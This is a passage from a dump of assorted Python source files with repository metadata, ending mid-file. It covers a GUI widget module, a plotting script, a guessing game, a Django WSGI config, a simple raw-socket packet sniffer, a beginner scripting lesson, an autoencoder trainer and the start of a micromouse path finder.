left+self._width;\n        pass\n        \n    def Move(self,dx,dy):\n        self._left += dx;\n        self._top += dy;\n        self.right += dx;\n        self.bottom += dy;\n        pass\n        \n    def Place(self): pass\n    \n    def TestPoint(self,x,y):\n        if (self.visible and self.enabled):\n            return (x > self.left and y < self.top and \n                    x < self.right and y > self.bottom);\n        return False;\n        \n    def ClickPoint(self,x,y):\n        return False;\n        \n    def xClickPoint(self,x,y):\n        if (self.visible and self.enabled):\n            return (x > self.left and y < self.top and \n                    x < self.right and y > self.bottom);\n        return False;\n        \n    def GainHilite(self):\n        pass\n        \n    def LoseHilite(self):\n        pass\n        \n        \n\n\n#-------------------------------------------------\n#-------------------------------------------------\n#-------------------------------------------------\n#-------------------------------------------------\n#-------------------------------------------------\n#-------------------------------------------------\n\n\n\n#\nclass FrameRect(FtreRect):\n    def __init__(self, bottom,left,top,right):\n        FtreRect.__init__(self, left,top,right,bottom);\n        self.lineThickness = 1.0;\n        pass\n    \n    def Draw(self):\n        knImages.DrawRect(self,self.lineThickness);\n        pass\n\n\n#\nclass ColorRect(FtreRect):\n    def __init__(self, bottom,left,top,right):\n        FtreRect.__init__(self, left,top,right,bottom);\n        self.color = (255,255,255,255);\n        pass\n        \n    def Draw(self):\n        knImages.FillRect(self, self.color);\n        pass\n\n#\nclass FtreImage(FtreRect):\n    def __init__(self, name, bottom,left):\n        self.image = knImages.LoadImage(name+'.png');\n        FtreRect.__init__(self, left, bottom+self.image.height,\n                                   left+self.image.width, bottom);\n        pass\n    \n    def Draw(self):\n        self.image.blit(self.left,self.bottom);\n        pass\n\n#                \nclass FtreSprite(FtreRect):\n    def __init__(self, name, bottom,left):\n        self.image = knImages.BuildLoadSprite(name+'.png');\n        FtreRect.__init__(self, left, bottom+self.image.height,\n                                   left+self.image.width, bottom);\n        knImages.PlaceFeature(self);\n        pass\n    \n    def Draw(self):\n        self.image.draw();\n        pass\n\n#\nclass FtreButton(FtreRect):\n    def __init__(self, name, bottom,left):\n        self.image = knImages.BuildLoadSprite(name+'.png');\n        self.imageHi = knImages.BuildLoadSprite(name+'HI.png');\n        self.imagePs = knImages.BuildLoadSprite(name+'PS.png');\n        FtreRect.__init__(self, left, bottom+self.image.height,\n                                   left+self.image.width, bottom);\n                                   \n        knImages.PlaceFeature(self,self.image);\n        knImages.PlaceFeature(self,self.imageHi);\n        knImages.PlaceFeature(self,self.imagePs);\n        pass\n    \n    def Draw(self):\n        if (currentHilite == self):\n            if (knEvents.mouseDown):\n                self.imagePs.draw();\n            else:\n                self.imageHi.draw();\n        else:\n           self.image.draw();\n        pass\n                \n#                \nclass FtreString(FtreRect):\n    def __init__(self, s, midy,midx, fSize=24, fFont=knFonts.gDefaultFont):\n        self.string = s;\n        self.image = knFonts.RenderStr(s, size=fSize, font=fFont);\n        self.image.x = midx;\n        self.image.y = midy;\n        halfWid = self.image.content_width/2;\n        halfHit = self.image.content_height/2;\n        FtreRect.__init__(self, midx-halfWid, midy+halfHit,\n                                   midx+halfWid, midy-halfHit);\n        pass\n    \n    def UpdateString(self, s, fSize=24, fFont=knFonts.gDefaultFont):\n        self.string = s;\n        self.image = knFonts.RenderStr(s, size=fSize, font=fFont);\n        midx,midy = (self.midx, self.midy);\n        self.image.x = midx;\n        self.image.y = midy;\n        halfWid = self.image.content_width/2;\n        halfHit = self.image.content_height/2;\n        self.SetBounds(midx-halfWid, midy+halfHit, midx+halfWid, midy-halfHit);\n        pass\n        \n    def TestPoint(self,x,y):\n        return False;\n        \n    def TestClick(self,x,y):\n        return False;\n    \n    def Draw(self):\n        self.image.draw();\n        pass\n\n\n#                \nclass FtreText(FtreRect):\n    def __init__(self, s, midy,midx, fSize=12, width=600):\n        self.string = s;\n        self.image = knFonts.RenderText(s, size=fSize, wid=width);\n        self.image.x = midx;\n        self.image.y = midy;\n        halfWid = self.image.content_width/2;\n        halfHit = self.image.content_height/2;\n        FtreRect.__init__(self, midx-halfWid, midy+halfHit,\n                                   midx+halfWid, midy-halfHit);\n        pass\n    \n    def TestPoint(self,x,y):\n        return False;\n        \n    def TestClick(self,x,y):\n        return False;\n    \n    def Draw(self):\n        self.image.draw();\n        pass\n\n\n#                \nclass FtreStrBtn(FtreRect):\n    def __init__(self, s, midy,midx, fSize=24):\n        self.string = s;\n        self.clickAction = fNOP;\n        self.image = knFonts.RenderStr(s, font='Arial Bold',size=fSize);\n        self.imageHi = knFonts.RenderStr(s, font='Arial Bold',size=fSize,color = (90,90,250,255));\n        self.imagePs = knFonts.RenderStr(s, font='Arial Bold',size=fSize,color = (0,200,90,255));\n        \n        self.image.x,self.image.y = (midx,midy);\n        self.imageHi.x,self.imageHi.y = (midx,midy);\n        self.imagePs.x,self.imagePs.y = (midx,midy);\n\n        halfWid = self.image.content_width/2;\n        halfHit = self.image.content_height/2;\n        FtreRect.__init__(self, midx-halfWid, midy+halfHit,\n                                   midx+halfWid, midy-halfHit);\n        pass\n    \n    def Draw(self):\n        if (currentHilite == self):\n            if (knEvents.mouseDown):\n                self.imagePs.draw();\n            else:\n                self.imageHi.draw();\n        else:\n           self.image.draw();\n        pass\n\n\n\n        \n#-------------------------------------------------\n\ndef RemoveFeature(f):\n    if f in allFeatures:\n        allFeatures.remove(f);\n    pass\n    \ndef BringToFront(f):\n    RemoveFeature(f);\n    allFeatures.append(f);\n    pass\n    \n            \n#-------------------------------------------------\n\nclickedFeature = None;\n\ndef DrawFeatures():\n    for f in allFeatures:\n        if (f.visible):\n            f.Draw();\n\n\ndef MouseMoveFeatures(x,y, dx,dy, mods):\n    MouseTestFeatures(x,y);\n    pass\n    \ndef MouseTestFeatures(x,y):\n    global currentHilite\n    \n    #search for hilites\n    for f in reversed(allFeatures):\n        if (f.visible and f.TestPoint(x,y)):\n            currentHilite = f;\n            return;\n    currentHilite = None;\n    pass\n\n\ndef MousePressFeatures(x,y, keyMods):\n    global clickedFeature\n    \n    if (currentHilite):\n        clickedFeature = currentHilite;\n        clickedFeature.ClickPoint(x,y);\n    pass\n    \ndef MouseReleaseFeatures(x,y, keyMods):\n    global clickedFeature\n    \n    if (currentHilite and currentHilite == clickedFeature):\n        clickedFeature.clickAction(clickedFeature);\n    \n    clickedFeature = None;\n    dx,dy = knEvents.mouseDelta;\n    MouseMoveFeatures(x,y, dx,dy, keyMods);\n    pass\n    \n"}
{"blob_id": "c6c6ddfa1a690619e1526367e462d7a01825013f", "directory_id": "165478aa697ba81d7adc1dc3b081fc97ffafb723", "path": "/scripts/bdt_looper/xgboost/python/others/plot_prune.py", "content_id": "b9640c0234a648de143dd8419517f6f39fdcb3e6", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "zhangzc11/WVZLooper", "snapshot_id": "d55c24127a65a36bd4a0ac25a8c53c007b5a71a1", "revision_id": "4b2eb46392c228672d5a2db30539b49aeb58cd1c", "branch_name": "refs/heads/readBDTNtuple", "visit_date": "2020-05-20 16:28:18.838367", "revision_date": "2019-09-27 19:19:57", "committer_date": "2019-09-27 19:19:57", "github_id": "185660975", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2019-05-08 18:39:19", "gha_created_at": "2019-05-08 18:39:19", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "681", "extension": "py", "content": "import numpy as np\nimport matplotlib.pyplot as plt\nimport os\n\ntest_name = 'xgb_wwz_vs_ttz_nbAll_full'\n\nplotDir = \"/home/users/zhicaiz/public_html/WWZ/BDT/\"\n\nname = []\nAUC = []\nwith open(\"result_prune_ttZ.txt\") as f:\n    lines = f.readlines()\n    for line in lines:\n        line_items = line.strip('\\n').split()\n        name.append(line_items[0])\n        AUC.append(float(line_items[1]))\n\nplt.figure()\nplt.plot(name, AUC, lw=2)\nplt.xticks(rotation=90)\nplt.xlabel('cumulative removed features (left to right)')\nplt.ylabel('AUC after removal')\nplt.savefig(plotDir+'training/AUC_vs_removed_features_'+test_name+'.png', bbox_inches='tight')\nos.system(\"chmod 755 \"+plotDir+\"training/*\")\n"}
{"blob_id": "3f8f0173eb5ee78095d6144444c259901ff610f5", "directory_id": "c93f2e1433985017a5f712a376808c718b055062", "path": "/random.py", "content_id": "004de2f1c0fc2c98049c16334983d05fb8a8856b", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "BorG1985/sabiranje", "snapshot_id": "66926d22fefc3d76716c8a254e88d258c952bf76", "revision_id": "1ab30d596d0f4ae05d8b83e92ae8d97a3099e1cd", "branch_name": "refs/heads/main", "visit_date": "2023-01-13 21:53:03.644097", "revision_date": "2020-11-16 14:38:25", "committer_date": "2020-11-16 14:38:25", "github_id": "311943096", "star_events_count": "2", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "235", "extension": "py", "content": "import random\n\nx=int(input(\"Unesite broj izmedju 1 i 10 : \"))\nprint(\"Va\u0161 broj je :\", x)\ny=random.randint(1,10)\nprint(\"CPU broj je : \", y)\nprint(y)\nif x==y :\n    print(\"pogodili te, cestitamo!\")\nelse:\n    print(\"Vise srece drugi put\")\n"}
{"blob_id": "8cd3a9948403378a53eba4364871109d347c1538", "directory_id": "7d01684e1be7d1bebc0b8ba07bb3321f9b227156", "path": "/adsame/wsgi.py", "content_id": "4b90b58e58501ed41be4f40c0882a4aeb2ce0b30", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "kurtsun/webadmin", "snapshot_id": "06d7027f4898e7a05d2d255e8d43c248dd3f6b9b", "revision_id": "66e1c42bad928ff6d7b69ae9067a37394911f560", "branch_name": "refs/heads/master", "visit_date": "2021-01-10 08:00:56.659176", "revision_date": "2016-02-27 00:29:15", "committer_date": "2016-02-27 00:29:15", "github_id": "50333515", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1134", "extension": "py", "content": "\"\"\"\nWSGI config for adsame project.\n\nThis module contains the WSGI application used by Django's development server\nand any production WSGI deployments. It should expose a module-level variable\nnamed ``application``. Django's ``runserver`` and ``runfcgi`` commands discover\nthis application via the ``WSGI_APPLICATION`` setting.\n\nUsually you will have the standard Django WSGI application here, but it also\nmight make sense to replace the whole Django WSGI application with a custom one\nthat later delegates to the Django one. For example, you could introduce WSGI\nmiddleware here, or combine a Django application with an application of another\nframework.\n\n\"\"\"\nimport os\n\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"adsame.settings\")\n\n# This application object is used by any WSGI server configured to use this\n# file. This includes Django's development server, if the WSGI_APPLICATION\n# setting points here.\nfrom django.core.wsgi import get_wsgi_application\napplication = get_wsgi_application()\n\n# Apply WSGI middleware here.\n# from helloworld.wsgi import HelloWorldApplication\n# application = HelloWorldApplication(application)\n"}
{"blob_id": "7fedba3d440aeb59d7d3c9ab112c02348471a07f", "directory_id": "2116ea1e2897fd56b88d86f9540c224870fdbf0b", "path": "/python/network/sniffer.py", "content_id": "c9e47c8ad11a68bce65dfbf23250d682a7db18e0", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "rockneurotiko/snippets", "snapshot_id": "18343f2078c36d2b699073b2fe8d16457a2aff7e", "revision_id": "266e4e04911136c1f9eee13c8916a24f04173b66", "branch_name": "refs/heads/master", "visit_date": "2021-01-15 21:38:56.262263", "revision_date": "2012-08-19 17:53:40", "committer_date": "2012-08-19 17:53:40", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "6279", "extension": "py", "content": "# -*- coding:utf-8 -*-\n#\n# Copyright (C) 2012, Maximilian K\u00f6hl <linuxmaxi@googlemail.com>\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nimport socket\nimport struct\nimport textwrap\nimport time\n\nclass Pcap():\n    def __init__(self, filename, link_type=1):\n        self.pcap = open(filename, 'wb')\n        self.pcap.write(struct.pack('@ I H H i I I I', 0xa1b2c3d4, 2, 4, 0, 0,\n                                    65535, link_type))\n    \n    def write(self, packet):\n        ts_sec, ts_usec = map(int, str(time.time()).split('.'))\n        length = len(packet)\n        self.pcap.write(struct.pack('@ I I I I', ts_sec, ts_usec, length, length))\n        self.pcap.write(packet)\n    \n    def close(self):\n        self.pcap.close()\n\ndef format_multiline(prefix, string, length=80):\n    length = length - len(prefix)\n    if isinstance(string, bytes):\n        string = ''.join(r'\\x{:02x}'.format(byte) for byte in string)\n        if length % 2: length -= 1\n    return '\\n'.join([prefix + line\n                      for line in textwrap.wrap(string, length)])\n\ndef mac(address):\n    return (':'.join(map('{:02x}'.format, address))).upper()\n\ndef ethernet_frame(data):\n    destination, source, protocol = struct.unpack('! 6s 6s H', data[:14])\n    return mac(destination), mac(source), socket.htons(protocol), data[14:]\n\ndef ipv4(address):\n    return '.'.join(map(str, address))\n\ndef ipv4_packet(data):\n    version_header_length = data[0]\n            \n    version = version_header_length >> 4\n    header_length = (version_header_length & 15) * 4\n\n    ttl, protocol, source, target = struct.unpack('! 8x B B 2x 4s 4s', data[:20])\n    \n    return (version, header_length, ttl, protocol, ipv4(source), ipv4(target),\n            data[header_length:])\n\ndef icmp_packet(data):\n    type, code, checksum = struct.unpack('! B B H', data[:4])\n    return type, code, checksum, data[4:]  \n\ndef tcp_segment(data):\n    (source_port, destination_port, sequence, acknowledgment,\n     offset_reserved_flags) = struct.unpack('! H H L L H', data[:14])\n    \n    offset = (offset_reserved_flags >> 12) * 4\n    flag_urg = (offset_reserved_flags & 32) >> 5\n    flag_ack = (offset_reserved_flags & 16) >> 4\n    flag_psh = (offset_reserved_flags & 8) >> 3\n    flag_rst = (offset_reserved_flags & 4) >> 2\n    flag_syn = (offset_reserved_flags & 2) >> 1\n    flag_fin = offset_reserved_flags & 1\n    \n    return (source_port, destination_port, sequence, acknowledgment, flag_urg,\n            flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data[offset:])\n\ndef udp_segment(data):\n    source_port, destination_port, length = struct.unpack('! H H 2x H', data[:8])\n    return source_port, destination_port, length, data[8:]\n\nif __name__ == '__main__':\n    import sys\n    \n    if len(sys.argv) == 2:\n        pcap = Pcap(sys.argv[1])\n    else:\n        pcap = None\n    \n    connection = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))\n    \n    while True:\n        data, address = connection.recvfrom(65535)\n        \n        if pcap is not None: pcap.write(data)\n        \n        destination, source, protocol, data = ethernet_frame(data)\n        \n        print('Ethernet Frame:')\n        print(('| - Destination: {}, Source: {}, Protocol: {}')\n              .format(destination, source, protocol))\n        \n        if protocol == 8:\n            (version, header_length, ttl, protocol, source, target,\n             data) = ipv4_packet(data)\n            \n            print('| - IPv4 Packet:')\n            print(('    | - Version: {}, Header Length: {}, TTL: {},'\n                   ).format(version, header_length, ttl))\n            print(('    | - Protocol: {}, Source: {}, Target: {}'\n                   ).format(protocol, source, target))\n            \n            if protocol == 1:\n                type, code, checksum, data = icmp_packet(data)\n                print('    | - ICMP Packet:')\n                print(('        | - Type: {}, Code: {}, Checksum: {},'\n                       ).format(type, code, checksum))\n                print('        | - Data:')\n                print(format_multiline('            | - ', data))\n                \n            elif protocol == 6:\n                (source_port, destination_port, sequence, acknowledgment,\n                 flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin,\n                 data) = tcp_segment(data)\n                print('    | - TCP Segment:')\n                print(('        | - Source Port: {}, Destination Port: {}'\n                       ).format(source_port, destination_port))\n                print(('        | - Sequence: {}, Acknowledgment: {}'\n                       ).format(sequence, acknowledgment))\n                print('        | - Flags:')\n                print(('             | - URG: {}, ACK: {}, PSH: {}, RST: {}, '\n                       'SYN: {}, FIN:{}').format(flag_urg, flag_ack, flag_psh,\n                                                 flag_rst, flag_syn, flag_fin))\n                print('        | - Data:')\n                print(format_multiline('            | - ', data))\n            \n            elif protocol == 17:\n                source_port, destination_port, length, data = udp_segment(data)\n                print('    | - UDP Segment:')\n                print(('        | - Source Port: {}, Destination Port: {}, '\n                       'Length: {}').format(source_port, destination_port, length))\n                      \n            else:\n                print('    | - Data:')\n                print(format_multiline('        | - ', data))\n                                  \n        else:\n            print('| - Data:')\n            print(format_multiline('    | - ', data))\n        \n        print()\n        "}
{"blob_id": "da7cf50f5c8f9940b3e8f242219bd6e283dc4926", "directory_id": "9433617418eab26490bb75e73cdd47317cbb935a", "path": "/python/script.py", "content_id": "b26f778319248cc21da82ba34ba0c56b0bc366bd", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "cdufour/tsrs21-scripting", "snapshot_id": "3033d8413a8ca313986e612b73ef3e7b931c61b8", "revision_id": "50b821176d7346001f49854791b6d47c090833c8", "branch_name": "refs/heads/master", "visit_date": "2022-04-18 10:16:47.048124", "revision_date": "2020-04-20 07:50:53", "committer_date": "2020-04-20 07:50:53", "github_id": "255838020", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "696", "extension": "py", "content": "# script python\n\n# firewall est une variable de type str\nfirewall = \"192.168.0.17\"\n\nnom = \"Chris\"  # type str\nage = 120 # type int\ntva = 5.5 # type float\ncontamin\u00e9 = False # type bool\n\n# Affichage\nprint(nom) # affiche le contenu de la variable\nprint(\"Formation Scripting\") # affiche la cha\u00eene de caract\u00e8res\n\n# R\u00e9cup\u00e9rer des saisies utilisateur\n# saisie = input() # exemple: blabla\n\n# Attention, la fonction input renvoie toujours un str\n# il faut convertir la valeur en int si l'on souhaite faire des calculs\n# avec la valeur saisie\nsaisie = int(input()) # conversion en int de la cha\u00eene saisie\nprint(\"Valeur saisie: \", saisie) # affichage de la valeur saisie => blabla\nprint(type(saisie))\n"}
{"blob_id": "6abf0934b78d45b1ea202bae662d5f97493e2d1b", "directory_id": "63e3df8ef8de1de01cf8f2befc1cc1449416deba", "path": "/ARE/old/ARE_transposeCnn_linearLayer.py", "content_id": "ea4f1d78b1e42673a6cf107f471ba912dda10ebd", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "volpato30/R-D", "snapshot_id": "b0ef1d34ee84f0a82c80840dfdaa53675de887ed", "revision_id": "df44b26e9e832a150722d36b528eaa20b2a2ab9b", "branch_name": "refs/heads/master", "visit_date": "2020-05-29 14:41:17.037872", "revision_date": "2016-11-04 03:34:53", "committer_date": "2016-11-04 03:34:53", "github_id": "62595977", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "9377", "extension": "py", "content": "from __future__ import print_function\nimport os, sys, urllib, gzip\ntry:\n    import cPickle as pickle\nexcept:\n    import pickle\nsys.setrecursionlimit(10000)\n\nimport numpy as np\nimport lasagne\nfrom lasagne.layers import Conv2DLayer, TransposedConv2DLayer, ReshapeLayer, DenseLayer, InputLayer\nfrom lasagne.layers import get_output, Upscale2DLayer\nfrom lasagne.nonlinearities import rectify, leaky_rectify, tanh\nfrom lasagne.updates import nesterov_momentum\nfrom lasagne.regularization import regularize_network_params,regularize_layer_params, l2, l1\nimport theano\nimport theano.tensor as T\nimport time\nimport matplotlib\nimport matplotlib.pyplot as plt\n\nLABEL = sys.argv[1] if len(sys.argv) > 1 else '0'\nENCODE_SIZE = int(sys.argv[2]) if len(sys.argv) > 2 else 64\nWEIGHT_FILE_NAME = './weights/ARE_transposeConv_linearLayer_BindW_encode_size{}'.format(ENCODE_SIZE)+'.npz'\n\nwith np.load('./data/lena_data.npz') as f:\n            data = [f['arr_%d' % i] for i in range(len(f.files))]\nX_forward, X_forward_out, X_backward, X_backward_out = data\n# X_forward shape : (100,40,1,72,72)\n\ndef get_layer_by_name(net, name):\n    for i, layer in enumerate(lasagne.layers.get_all_layers(net)):\n        if layer.name == name:\n            return layer, i\n    return None, None\n\ndef build_ARE(input_var=None, encode_size = 64):\n    l_in = InputLayer(shape=(None,  X_forward.shape[2], X_forward.shape[3], X_forward.shape[4]),input_var=input_var)\n    conv1 = Conv2DLayer(l_in, 16, 6, stride=2, W=lasagne.init.Orthogonal('relu'), pad=0)\n    conv2 = Conv2DLayer(conv1, 32, 6, stride = 2, W=lasagne.init.Orthogonal('relu'), pad = 0)\n    conv3 = Conv2DLayer(conv2, 64, 5, stride = 2, W=lasagne.init.Orthogonal('relu'), pad = 0)\n    conv4 = Conv2DLayer(conv3, 128, 4, stride = 2, W=lasagne.init.Orthogonal('relu'), pad = 0)\n    reshape1 = ReshapeLayer(conv4, shape =(([0], -1)))\n\n    mid_size = np.prod(conv4.output_shape[1:])\n\n    encode_layer = DenseLayer(reshape1, name= 'encode', num_units= encode_size, W=lasagne.init.Orthogonal('relu'),\\\n                                  nonlinearity=lasagne.nonlinearities.rectify)\n\n    action_layer = DenseLayer(encode_layer, name= 'action', num_units= encode_size, W=lasagne.init.Orthogonal(1.0),\\\n                                  nonlinearity=None)\n    mid_layer = DenseLayer(action_layer, num_units = mid_size, W=lasagne.init.Orthogonal('relu'), nonlinearity=lasagne.nonlinearities.rectify)\n\n    reshape2 = ReshapeLayer(mid_layer, shape =(([0], conv4.output_shape[1], conv4.output_shape[2], conv4.output_shape[3])))\n\n    deconv1 = TransposedConv2DLayer(reshape2, conv4.input_shape[1],\n                                   conv4.filter_size, stride=conv4.stride, crop=0,\n                                   W=conv4.W, flip_filters=not conv4.flip_filters)\n    deconv2 = TransposedConv2DLayer(deconv1, conv3.input_shape[1],\n                                   conv3.filter_size, stride=conv3.stride, crop=0,\n                                   W=conv3.W, flip_filters=not conv3.flip_filters)\n    deconv3 = TransposedConv2DLayer(deconv2, conv2.input_shape[1],\n                                   conv2.filter_size, stride=conv2.stride, crop=0,\n                                   W=conv2.W, flip_filters=not conv2.flip_filters)\n    deconv4 = TransposedConv2DLayer(deconv3, conv1.input_shape[1],\n                                   conv1.filter_size, stride=conv1.stride, crop=0,\n                                   W=conv1.W, flip_filters=not conv1.flip_filters)\n    reshape3 = ReshapeLayer(deconv4, shape =(([0], -1)))\n    return reshape3\n#\nclass ARE(object):\n    def __init__(self, lambda1 = 0, lambda2 = 0):\n        self.input_var = T.tensor4('inputs')\n        self.target_var = T.matrix('targets')\n        self.are_net = build_ARE(self.input_var, ENCODE_SIZE)\n        self.reconstructed = lasagne.layers.get_output(self.are_net)\n        self.encode_layer, _ = get_layer_by_name(self.are_net, 'encode')\n        self.action_layer, _ = get_layer_by_name(self.are_net, 'action')\n        self.encoded_feature = lasagne.layers.get_output(self.encode_layer)\n        self.transformed_feature = lasagne.layers.get_output(self.action_layer)\n        self.l1_penalty = regularize_network_params(self.are_net, l1)\n        self.loss = lasagne.objectives.squared_error(self.reconstructed, self.target_var)\n        self.XXT = T.dot(self.encoded_feature, self.encoded_feature.transpose()) + T.dot(self.transformed_feature, self.transformed_feature.transpose())\n        self.loss = self.loss.mean() + lambda1 * self.l1_penalty + lambda2 * self.XXT.trace()\n        self.loss = self.loss.mean() + lambda1 * self.l1_penalty\n        self.params = lasagne.layers.get_all_params(self.are_net, trainable=True)\n        self.l_r = theano.shared(np.array(0.01, dtype=theano.config.floatX))\n        self.updates = lasagne.updates.nesterov_momentum(\n            self.loss, self.params, learning_rate=self.l_r, momentum=0.90)\n        self.train_fn = theano.function([self.input_var, self.target_var], self.loss, updates=self.updates,on_unused_input='warn')\n        self.best_err = 999\n        self.action1_w = np.eye(ENCODE_SIZE, dtype = np.float32)\n        self.action1_b = np.zeros(ENCODE_SIZE, dtype = np.float32)\n        self.action2_w = np.eye(ENCODE_SIZE, dtype = np.float32)\n        self.action2_b = np.zeros(ENCODE_SIZE, dtype = np.float32)\n        # self.action3_w = np.eye(ENCODE_SIZE, dtype = np.float32)\n        # self.action3_b = np.zeros(ENCODE_SIZE, dtype = np.float32)\n        # self.action4_w = np.eye(ENCODE_SIZE, dtype = np.float32)\n        # self.action4_b = np.zeros(ENCODE_SIZE, dtype = np.float32)\n\n    def load_pretrained_model(self, file_name=WEIGHT_FILE_NAME):\n        with np.load(file_name) as f:\n            param_values = [f['arr_%d' % i] for i in range(len(f.files))]\n        lasagne.layers.set_all_param_values(self.are_net, param_values)\n\n    def set_action_layer(self, action_id):\n        if action_id == 1:\n            self.action_layer.W.set_value(self.action1_w)\n            self.action_layer.b.set_value(self.action1_b)\n        elif action_id == 2:\n            self.action_layer.W.set_value(self.action2_w)\n            self.action_layer.b.set_value(self.action2_b)\n        elif action_id == 3:\n            self.action_layer.W.set_value(self.action3_w)\n            self.action_layer.b.set_value(self.action3_b)\n        elif action_id == 4:\n            self.action_layer.W.set_value(self.action4_w)\n            self.action_layer.b.set_value(self.action4_b)\n        else:\n            raise Exception('not a valid action')\n\n    def get_action_layer(self, action_id):\n        if action_id == 1:\n            self.action1_w = self.action_layer.W.get_value()\n            self.action1_b = self.action_layer.b.get_value()\n        elif action_id == 2:\n            self.action2_w = self.action_layer.W.get_value()\n            self.action2_b = self.action_layer.b.get_value()\n        elif action_id == 3:\n            self.action3_w = self.action_layer.W.get_value()\n            self.action3_b = self.action_layer.b.get_value()\n        elif action_id == 4:\n            self.action4_w = self.action_layer.W.get_value()\n            self.action4_b = self.action_layer.b.get_value()\n        else:\n            raise Exception('not a valid action')\n\n\n    def reset_loss(self, lambda1 = 0, lambda2 = 0):\n        self.loss = lasagne.objectives.squared_error(self.reconstructed, self.target_var)\n        self.loss = self.loss.mean() + lambda1 * self.l1_penalty + lambda2 * self.XXT.trace()\n\n    def train_ARE_network(self, num_epochs=50, verbose = True, save_model = False):\n        if verbose:\n            print(\"Starting training...\")\n        for epoch in range(num_epochs):\n            start_time = time.time()\n            train_err = 0\n            self.set_action_layer(1)\n            for i in range(X_forward.shape[0]):\n                train_err1 = self.train_fn(X_forward[i], X_forward_out[i])\n                train_err += (train_err1)\n            self.get_action_layer(1)\n            self.set_action_layer(2)\n            for i in range(X_forward.shape[0]):\n                train_err2 = self.train_fn(X_backward[i], X_backward_out[i])\n                train_err += (train_err2)\n            self.get_action_layer(2)\n            train_err = train_err/float(2 * X_forward.shape[0])\n            if verbose:\n                print(\"Epoch {} of {} took {:.3f}s\".format(\n                    epoch + 1, num_epochs, time.time() - start_time))\n                print(\"training loss:\\t\\t{:.6f}\".format(float(train_err)))\n\n            if save_model:\n                if train_err < self.best_err:\n                    self.best_err = train_err\n                    print('save best model which has train_err: {:.7f}'.format(self.best_err))\n                    np.savez(WEIGHT_FILE_NAME, *lasagne.layers.get_all_param_values(self.are_net))\n# main part\nlena_are = ARE()\nlena_are.l_r.set_value(0.1)\nlena_are.train_ARE_network(num_epochs=10, verbose = True, save_model = True)\nlena_are.load_pretrained_model()\nlena_are.l_r.set_value(0.05)\nlena_are.train_ARE_network(num_epochs=100, verbose = True, save_model = True)\nlena_are.load_pretrained_model()\nlena_are.l_r.set_value(0.01)\nlena_are.train_ARE_network(num_epochs=500, verbose = True, save_model = True)\nlena_are.load_pretrained_model()\nlena_are.l_r.set_value(0.005)\nlena_are.train_ARE_network(num_epochs=500, verbose = True, save_model = True)\n"}
{"blob_id": "aeaadde578bf0fba9d22b863a88708e0adcddbb4", "directory_id": "a399cdcb558e2a6379644b8461c4e73b97b791df", "path": "/path_finder.py", "content_id": "a3dec4f81c4d80dfae027c17da5d1107cb0e617a", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "varadvjoshi99/Micro_Mouse_Simulator", "snapshot_id": "6c7da2ee3e5c3fb4cb65945841d71e06f7e5e476", "revision_id": "3cc60d185159f9030cc20d318506df1f4d3dec94", "branch_name": "refs/heads/master", "visit_date": "2023-03-11 14:17:54.187900", "revision_date": "2021-02-22 03:01:29", "committer_date": "2021-02-22 03:01:29", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "8297", "extension": "py", "content": "import API\nimport sys\nfrom utils import get_visited, get_front, get_left, get_right, get_opposite_direction\nfrom queue import Queue\n\n\nclass PathFinder:\n    def __init__(self):\n        self.maze = list()\n        self.maze_weight = list()\n        self.MAZE_WIDTH = API.mazeWidth()\n        self.MAZE_HEIGHT = API.mazeHeight()\n        self.BOT_DIRECTION = 0  # default upwards\n        self.curr_x = 0\n        self.curr_y = 0\n        self.drs = [1, 0, -1, 0]\n        self.dcs = [0, 1, 0, -1]\n        self.initialize_maze()\n\n    def initialize_maze(self):\n        for i in range(self.MAZE_HEIGHT):\n            temp = list()\n            weight_temp = list()\n            for j in range(self.MAZE_WIDTH):\n                walls = list()\n                weight_temp.append(0)\n                for k in range(4):\n                    walls.append(0)\n                temp.append(walls)\n            self.maze.append(temp)\n            self.maze_weight.append(weight_temp)\n\n    def log(self, string):\n        sys.stderr.write(\"{}\\n\".format(string))\n        sys.stderr.flush()\n\n    def is_valid(self, x, y):\n        return 0 <= x < self.MAZE_WIDTH and 